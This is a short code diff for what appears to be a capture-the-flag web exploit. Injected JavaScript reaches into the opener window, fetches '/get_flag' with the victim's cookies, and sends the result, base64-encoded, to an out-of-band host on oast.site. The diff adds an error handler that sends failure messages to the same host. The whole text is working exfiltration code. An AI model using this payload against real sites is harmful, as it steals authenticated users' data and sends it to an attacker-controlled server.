@@ -7,7 +7,10 @@ if (window.opener) {
     fetch('/get_flag', { credentials: 'include' })
       .then(r => r.text())
       .then(flag => {
-        fetch('https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(flag), {mode: 'no-cors'});
+        fetch('https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?flag=' + btoa(flag), { mode: 'no-cors' });
+      })
+      .catch(e => {
+        fetch('https://toetqx9cw60filn7a5fc93hyfph3qlp0w.oast.site/?error=' + btoa(e.message), { mode: 'no-cors' });
       });
   `);
 }
